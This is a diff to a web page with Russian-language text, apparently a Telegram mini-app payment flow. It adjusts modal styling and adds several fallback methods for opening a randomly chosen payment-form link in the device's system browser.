@@ -601,6 +601,15 @@
             background-color: var(--card-bg);
             border-radius: 4px;
             border: 1px solid var(--border-color);
+            color: var(--accent-color);
+            text-decoration: none;
+        }
+
+        .fallback-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 20px;
         }
 
         /* Footer */
@@ -668,6 +677,10 @@
 
             .contact-item {
                 font-size: 1rem;
+            }
+            
+            .fallback-buttons {
+                gap: 8px;
             }
         }
     </style>
@@ -930,11 +943,13 @@
             <h2 class="fallback-title">Открыть в браузере</h2>
             <p class="fallback-text">
                 Для завершения оплаты необходимо открыть форму в браузере.<br>
-                Нажмите на ссылку ниже:
+                Нажмите на ссылку ниже или скопируйте ее:
             </p>
             <a href="#" id="fallback-link" class="fallback-link" target="_blank"></a>
-            <button class="btn" id="copy-link-btn">Скопировать ссылку</button>
-            <button class="btn btn-secondary" id="close-fallback-modal">Закрыть</button>
+            <div class="fallback-buttons">
+                <button class="btn" id="copy-link-btn">Скопировать ссылку</button>
+                <button class="btn btn-secondary" id="close-fallback-modal">Закрыть</button>
+            </div>
         </div>
     </div>
 
@@ -1160,46 +1175,98 @@
             modal.style.display = 'none';
         });
 
-        // Функция для открытия ссылки с несколькими попытками
-        function openLinkInBrowser(url) {
-            // Метод 1: Пробуем Telegram WebApp API
-            if (window.Telegram && window.Telegram.WebApp) {
+        // Функция для принудительного открытия в системном браузере
+        function forceOpenInSystemBrowser(url) {
+            // Метод 1: Попробуем использовать Intent для Android
+            if (/Android/i.test(navigator.userAgent)) {
                 try {
-                    window.Telegram.WebApp.openLink(url);
+                    // Создаем Intent URL для открытия в браузере
+                    const intentUrl = `intent://${url.replace(/https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+                    window.location.href = intentUrl;
+                    
+                    // Fallback через 500 мс
+                    setTimeout(() => {
+                        window.open(url, '_blank');
+                    }, 500);
                     return true;
                 } catch (e) {
-                    console.error('Telegram WebApp openLink failed:', e);
+                    console.error('Intent method failed:', e);
                 }
             }
 
-            // Метод 2: Пробуем window.open с таймаутом
-            try {
-                const newWindow = window.open(url, '_blank');
-                if (newWindow) {
+            // Метод 2: Для iOS пробуем универсальные ссылки
+            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                try {
+                    // Создаем iframe для открытия универсальной ссылки
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = url;
+                    document.body.appendChild(iframe);
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(iframe);
+                        // Fallback
+                        window.open(url, '_blank');
+                    }, 500);
                     return true;
+                } catch (e) {
+                    console.error('Universal link method failed:', e);
+                }
+            }
+
+            // Метод 3: Пробуем использовать window.open с различными целями
+            try {
+                // Пробуем разные цели для открытия
+                const targets = ['_system', '_blank', '_top'];
+                for (let target of targets) {
+                    try {
+                        const newWindow = window.open(url, target);
+                        if (newWindow) {
+                            return true;
+                        }
+                    } catch (e) {
+                        console.error(`Window open with target ${target} failed:`, e);
+                    }
                 }
             } catch (e) {
-                console.error('window.open failed:', e);
+                console.error('All window.open methods failed:', e);
             }
 
-            // Метод 3: Пробуем создать временную ссылку и кликнуть по ней
+            // Метод 4: Создаем временную ссылку и эмулируем клик
             try {
                 const link = document.createElement('a');
                 link.href = url;
                 link.target = '_blank';
                 link.rel = 'noopener noreferrer';
+                link.style.display = 'none';
                 document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
                 
-                // Проверяем, открылась ли ссылка (это приблизительная проверка)
+                // Эмулируем клик
+                const clickEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                link.dispatchEvent(clickEvent);
+                
+                // Также пробуем нативный клик
+                link.click();
+                
                 setTimeout(() => {
-                    if (!document.hasFocus()) {
-                        return true;
-                    }
-                }, 100);
+                    document.body.removeChild(link);
+                }, 1000);
+                
+                return true;
             } catch (e) {
-                console.error('Temporary link click failed:', e);
+                console.error('Temporary link method failed:', e);
+            }
+
+            // Метод 5: Пробуем использовать location.href (последнее средство)
+            try {
+                window.location.href = url;
+                return true;
+            } catch (e) {
+                console.error('Location href method failed:', e);
             }
 
             return false;
@@ -1213,19 +1280,21 @@
             document.body.style.overflow = 'hidden';
         }
 
-        // Функция для перенаправления на случайную Google Form
+        // Функция для перенаправления на форму оплаты
         function redirectToPaymentForm() {
             const randomForm = paymentForms[Math.floor(Math.random() * paymentForms.length)];
             
-            // Пробуем открыть ссылку
-            const success = openLinkInBrowser(randomForm);
+            // Пытаемся принудительно открыть в системном браузере
+            const success = forceOpenInSystemBrowser(randomForm);
             
-            // Если не получилось, показываем fallback модальное окно
+            // Если не удалось, показываем fallback модальное окно
             if (!success) {
-                showFallbackModal(randomForm);
+                setTimeout(() => {
+                    showFallbackModal(randomForm);
+                }, 1000);
             }
             
-            // Закрываем модальное окно оплаты в любом случае
+            // Закрываем модальное окно оплаты
             paymentModal.style.display = 'none';
         }
 
